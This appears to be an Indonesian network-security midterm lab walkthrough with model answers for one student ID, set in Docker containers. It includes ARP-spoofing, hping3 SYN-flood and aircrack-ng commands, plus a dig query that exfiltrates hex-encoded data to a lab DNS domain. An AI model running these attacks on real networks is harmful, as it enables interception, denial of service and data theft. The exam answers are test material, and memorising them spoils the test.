# Perintah Lengkap — Kasus 2 (NIM 24552011318)

Jalankan semua perintah di dalam folder `uts-network-lab` (hasil `docker build`
dari README.md harus sudah dilakukan). NIM Anda sudah saya isi langsung:
`24552011318`. Hex dari NIM itu sudah saya hitung di bawah: `3234353532303131333138`
(Anda tetap boleh menjalankan `echo -n 24552011318 | xxd -p` sendiri untuk
membuktikannya).

---

## Tugas 1 (Pertemuan 1): Docker, volume, dan compose dua service

```bash
docker volume create vol-k2
docker run --name w-k2 -v vol-k2:/data alpine sh -c 'echo 24552011318 > /data/laporan-k2.txt'
docker rm w-k2
docker run --rm -v vol-k2:/data alpine cat /data/laporan-k2.txt
# -> harus mencetak 24552011318, padahal container w-k2 sudah dihapus:
#    ini bukti data persisten karena ada di VOLUME, bukan di container.

docker compose -p k2 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k2 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k2 -f b/b1-compose/docker-compose.yml down -v
```
**Bukti yang perlu di-screenshot/salin:** isi file dari container baru (`24552011318`),
dan halaman HTML nginx default yang diambil `attacker` lewat `wget`.

---

## Tugas 2 (Pertemuan 2): Kriptografi (AES-256 + sertifikat self-signed)

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  echo isi laporan k2 > laporan-k2.txt &&
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k2.txt -out laporan-k2.enc -pass pass:kunci-k2-2026 &&
  sha256sum laporan-k2.txt &&
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k2.enc -out hasil-k2.txt -pass pass:kunci-k2-2026 &&
  sha256sum hasil-k2.txt'

docker run --rm -v "$PWD":/work uts-openssl sh -c '
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k2.pem -out cert-k2.pem -days 30 -subj /CN=k2.uts.local &&
  openssl x509 -in cert-k2.pem -noout -subject -issuer -dates'
```
**Bukti:** dua hash SHA-256 (`laporan-k2.txt` dan `hasil-k2.txt`) harus identik —
ini membuktikan dekripsi mengembalikan isi yang persis sama. Lalu Subject dan
Issuer sertifikat (keduanya akan menunjukkan `CN=k2.uts.local` yang sama —
itulah ciri self-signed).

**Jawaban "jelaskan" (self-signed vs CA):**
Sertifikat self-signed ditandatangani oleh kunci privat pemiliknya sendiri,
sehingga Subject dan Issuer-nya sama dan tidak ada pihak ketiga yang memverifikasi
identitas pemegangnya — browser/klien akan menampilkan peringatan "not trusted"
kecuali sertifikat itu ditambahkan manual ke daftar tepercaya. Sertifikat yang
ditandatangani CA (Certificate Authority) punya Issuer berbeda dari Subject,
karena ditandatangani oleh otoritas yang identitasnya sudah diverifikasi dan
akar kepercayaannya (root certificate) sudah tertanam di OS/browser, sehingga
klien bisa memverifikasi rantai kepercayaan tanpa peringatan.

---

## Tugas 3 (Pertemuan 3): ARP spoofing

> Perbaikan: perintah `docker inspect` di bawah memakai bentuk `index` karena
> nama network `lab-arp-k2` mengandung tanda hubung (lihat `CATATAN-PERBAIKAN.md`).

```bash
docker network create lab-arp-k2
docker run -d --name korban-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k2 --network lab-arp-k2 --cap-add NET_ADMIN uts-kali-tools

docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k2").IPAddress}}' korban-k2
docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k2").IPAddress}}' gateway-k2
# catat kedua IP ini, pakai sebagai <ip-korban> dan <ip-gateway> di bawah

docker exec korban-k2 arp -a
docker exec -d penyerang-k2 timeout 20 arpspoof -i eth0 -t <ip-korban> <ip-gateway>
sleep 3
docker exec korban-k2 arp -a
# -> bandingkan: MAC address untuk <ip-gateway> sekarang berubah jadi MAC penyerang-k2

docker exec korban-k2 arp -s <ip-gateway> $(docker exec gateway-k2 cat /sys/class/net/eth0/address)
docker exec korban-k2 arp -a
# -> MAC gateway kembali ke MAC aslinya (static ARP entry menolak update palsu)
```
**Bukti:** tiga kali output `arp -a` (sebelum spoofing, saat spoofing, setelah
mitigasi static ARP), tunjukkan MAC untuk `<ip-gateway>` berubah lalu kembali.

**Jawaban "jelaskan" (mitigasi):**
ARP tidak punya autentikasi, sehingga siapa pun di segmen jaringan yang sama
bisa mengirim balasan ARP palsu (gratuitous ARP) dan korban akan memperbaruinya
tanpa verifikasi. Mitigasi yang paling praktis di lab ini adalah **static ARP
entry** (perintah `arp -s` di atas) — memaksa pemetaan IP-ke-MAC gateway tetap
tetap meski ada balasan ARP palsu masuk. Di jaringan produksi, mitigasi yang
lebih skalabel adalah **Dynamic ARP Inspection (DAI)** pada switch terkelola.

---

## Tugas 4 (Pertemuan 4): Analisis handshake WPA2

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k2.txt handshake-k2.cap
```
File `handshake-k2.cap` dan `wordlist-k2.txt` disediakan penguji — taruh di
folder `uts-network-lab` sebelum menjalankan perintah ini.

**Jawaban "jelaskan" (4 langkah handshake WPA2 / 4-way handshake):**
1. **Message 1 (AP → klien):** AP mengirim nonce acak (ANonce).
2. **Message 2 (klien → AP):** klien membuat nonce sendiri (SNonce), menghitung
   PTK (Pairwise Transient Key) dari ANonce+SNonce+PMK, lalu mengirim SNonce
   beserta MIC (Message Integrity Code) ke AP.
3. **Message 3 (AP → klien):** AP yang sudah bisa menghitung PTK yang sama
   mengirim GTK (Group Temporal Key, untuk trafik broadcast) terenkripsi,
   disertai MIC.
4. **Message 4 (klien → AP):** klien mengonfirmasi penerimaan, koneksi siap
   memakai kunci sesi yang baru dibentuk.
`aircrack-ng` menguji setiap kata sandi di wordlist dengan menghitung ulang PMK
→ PTK → MIC dari handshake yang ditangkap, dan mencocokkan MIC-nya; kecocokan
berarti password ditemukan, dan "KEY NOT FOUND" berarti tidak ada kata di
wordlist yang cocok.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

```bash
docker run --rm --network lab-arp-k2 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <ip-korban>
```
(pakai `<ip-korban>` dari Tugas 3, atau IP container apa pun di `lab-arp-k2`).

**Jawaban "jelaskan" (smurf attack):**
Smurf attack adalah serangan DoS yang mengirim paket ICMP echo request dengan
**alamat sumber dipalsukan menjadi IP korban**, ke alamat broadcast suatu
jaringan. Semua host di jaringan itu akan membalas echo reply **ke korban**
secara bersamaan, membanjiri korban dengan trafik balasan yang jauh lebih
besar dari paket aslinya (amplifikasi). Mitigasi umum: menonaktifkan
directed broadcast di router (`no ip directed-broadcast`) dan memfilter paket
dengan source IP palsu (anti-spoofing/BCP38) di tepi jaringan.

---

## Tugas 6 (Pertemuan 6): SYN flood dan three-way handshake

```bash
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml up -d --build
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
sleep 3
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k2 -f b/b3-syn-flood/docker-compose.yml down -v
```
**Bukti:** angka SYN_RECV sebelum (biasanya 0) vs saat serangan (naik drastis),
dan di output `tcpdump` cari tiga paket berurutan dari `curl`: `[S]` (SYN),
`[S.]` (SYN-ACK), `[.]` (ACK) — itulah three-way handshake yang normal,
terjadi berdampingan dengan banjir SYN palsu dari `hping3`.

**Jawaban "jelaskan" (mitigasi SYN flood):**
**SYN cookies** adalah mitigasi paling umum: alih-alih menyimpan status koneksi
setengah-terbuka di memori untuk setiap SYN masuk (yang bisa dihabiskan
penyerang), server mengkodekan informasi koneksi ke dalam nomor urut SYN-ACK
itu sendiri (hash dari IP, port, waktu) dan tidak mengalokasikan memori sampai
ACK ketiga benar-benar diterima dan nomor urutnya tervalidasi. Aktifkan dengan
`sysctl -w net.ipv4.tcp_syncookies=1`. Alternatif/tambahan: rate-limiting SYN
per IP dengan `iptables` (`--syn --limit`).

---

## Tugas 7 (Pertemuan 7): DNS exfiltration

```bash
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011318 | xxd -p
# -> 3234353532303131333138  (hex NIM Anda)

docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333138.k2.exfil.lab @dns
docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k2.log
python3 kasus/k9-dns-detect/analisis_dns.py dns-k2.log

echo 3234353532303131333138 | xxd -r -p
# -> 24552011318  (NIM asli, terbukti ter-decode kembali)

docker compose -p k2 -f b/b4-dns-exfil/docker-compose.yml down -v
```
**Catatan penting:** label hex NIM Anda cuma 22 karakter, sedangkan
`analisis_dns.py` hanya menandai label sebagai "mencurigakan" kalau
panjangnya **lebih dari 30 karakter**. Jadi query Anda tetap akan muncul di
bagian "Jumlah query per domain induk" (menunjukkan ada query ke `k2.exfil.lab`),
tapi mungkin tidak masuk daftar "mencurigakan". Ini wajar untuk dijelaskan di
`jawaban.md`: exfiltrasi data nyata biasanya mengirim payload yang jauh lebih
besar dari satu NIM (file, kredensial, dsb.), sehingga labelnya panjang dan
baru terdeteksi heuristik seperti ini; untuk payload sekecil NIM, indikator
yang lebih relevan adalah **volume/frekuensi query ke domain asing yang tidak
pernah diakses sebelumnya** dan **pola subdomain acak/heksadesimal**, bukan
cuma panjang label.

**Bukti:** hasil `dig` (menunjukkan dnsmasq menjawab query untuk domain yang
mengandung payload), baris log dnsmasq yang memuat `3234353532303131333138.k2.exfil.lab`,
dan hasil decode `24552011318`.

**Jawaban "jelaskan" (kenapa DNS exfiltration sulit diblokir firewall biasa):**
Firewall biasa hampir selalu mengizinkan trafik DNS (port 53) keluar karena
DNS esensial untuk resolusi nama domain apa pun — memblokirnya akan merusak
konektivitas normal. Penyerang memanfaatkan ini dengan menyisipkan data ke
dalam subdomain (label) dari query DNS yang tampak sah ke domain yang mereka
kendalikan; firewall hanya melihat "query DNS keluar", bukan isi datanya. Satu
indikator deteksi: volume query DNS yang tinggi ke satu domain induk asing,
atau pola subdomain yang panjang dan acak/heksadesimal (seperti yang dicari
`analisis_dns.py`).
